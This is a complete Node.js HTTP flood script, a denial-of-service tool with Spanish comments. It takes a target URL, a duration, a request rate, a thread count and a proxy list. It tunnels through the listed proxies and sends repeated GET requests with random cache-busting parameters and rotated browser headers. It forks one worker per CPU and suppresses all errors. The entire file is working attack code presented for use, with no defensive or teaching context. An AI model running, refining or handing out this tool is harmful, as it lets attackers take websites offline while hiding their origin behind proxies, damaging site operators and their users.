const os = require("os");
const net = require("net");
const http = require("http");
const cluster = require("cluster");
const fs = require("fs");

// Ignorar errores
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

// Argumentos: node http.js <url> <tiempo> <rate> <threads> <proxyfile>
const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]) || 1,
  threads: parseInt(process.argv[5]) || os.cpus().length,
  proxyFile: process.argv[6]
};

if (process.argv.length < 7) {
  console.log("Usage: node http.js <target> <time> <rate> <threads> <proxyfile>");
  process.exit(1);
}

// Usar WHATWG URL API
let targetUrl;
try {
  targetUrl = new URL(args.target);
  // Forzar puerto 80 para HTTP
  if (!targetUrl.port) targetUrl.port = 80;
} catch (e) {
  console.log("Invalid URL format");
  process.exit(1);
}

// Funciones útiles
function readLines(file) {
  try {
    return fs.readFileSync(file, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
  } catch (e) {
    console.log("Error reading proxy file");
    process.exit(1);
  }
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(array) {
  return array[randomIntn(0, array.length)];
}

function randstr(length) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Listas de headers
const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
];

const language_header = ["en-US,en;q=0.9", "es-ES,es;q=0.9", "fr-FR,fr;q=0.8"];

// Clase para manejar conexiones proxy
class NetSocket {
  HTTP(proxy, callback) {
    const connectMsg = "CONNECT " + proxy.address + " HTTP/1.1\r\n" +
                      "Host: " + proxy.address + "\r\n" +
                      "Connection: Keep-Alive\r\n\r\n";
    
    const connectBuffer = Buffer.from(connectMsg);
    const options = {
      host: proxy.host,
      port: proxy.port
    };

    const socket = net.connect(options);
    socket.setTimeout(10000);
    socket.setKeepAlive(true, 60000);

    socket.on("connect", () => {
      socket.write(connectBuffer);
    });

    socket.on("data", (data) => {
      const response = data.toString("utf-8");
      if (response.includes("HTTP/1.1 200")) {
        callback(socket, null);
      } else {
        socket.destroy();
        callback(null, "Proxy error");
      }
    });

    socket.on("timeout", () => {
      socket.destroy();
      callback(null, "Timeout");
    });

    socket.on("error", () => {
      socket.destroy();
      callback(null, "Error");
    });
  }
}

const Socker = new NetSocket();

// Agente HTTP para reutilizar conexiones
const httpAgent = new http.Agent({
  keepAlive: true,
  maxSockets: 100,
  maxFreeSockets: 50,
  timeout: 60000
});

// Función principal de flooding para HTTP
function runFlooder() {
  const proxies = readLines(args.proxyFile);
  const proxy = randomElement(proxies).split(":");
  
  const proxyConfig = {
    host: proxy[0],
    port: parseInt(proxy[1]),
    address: targetUrl.hostname + ":80",
    timeout: 10
  };

  // Conectar mediante proxy
  Socker.HTTP(proxyConfig, (socket, error) => {
    if (error) return runFlooder();

    socket.setKeepAlive(true, 60000);

    // Intervalo de envío
    const interval = setInterval(() => {
      for (let i = 0; i < args.Rate; i++) {
        // Construir path con cachebuster
        let path = targetUrl.pathname;
        if (targetUrl.search) {
          path += targetUrl.search + "&cache=" + randstr(16) + "&_=" + Date.now();
        } else {
          path += "?cache=" + randstr(16) + "&_=" + Date.now();
        }

        const options = {
          hostname: targetUrl.hostname,
          port: 80,
          path: path,
          method: 'GET',
          headers: {
            "Host": targetUrl.hostname,
            "Accept": randomElement(accept_header),
            "Accept-Language": randomElement(language_header),
            "User-Agent": randomElement(userAgents),
            "Connection": "keep-alive",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache"
          },
          agent: httpAgent,
          createConnection: () => socket
        };

        const req = http.request(options);
        req.on('error', () => req.destroy());
        req.end();
      }
    }, 1000);

    // Manejar cierre del socket
    socket.on('close', () => {
      clearInterval(interval);
      socket.destroy();
      runFlooder();
    });

    socket.on('error', () => {
      clearInterval(interval);
      socket.destroy();
      runFlooder();
    });
  });
}

// Clusterización
if (cluster.isMaster) {
  console.log(`[HTTP] Target: ${args.target} | Duration: ${args.time}s | Rate: ${args.Rate}/s | Threads: ${args.threads} | Proxy: ${args.proxyFile}`);
  console.log(`[HTTP] Using port: 80`);
  
  // Iniciar workers
  for (let i = 0; i < args.threads; i++) {
    cluster.fork();
  }

  // Finalizar después del tiempo especificado
  setTimeout(() => {
    console.log("[HTTP] Attack finished");
    process.exit(0);
  }, args.time * 1000);
} else {
  // Worker: ejecutar flooder continuamente
  setInterval(runFlooder, 100);
    }
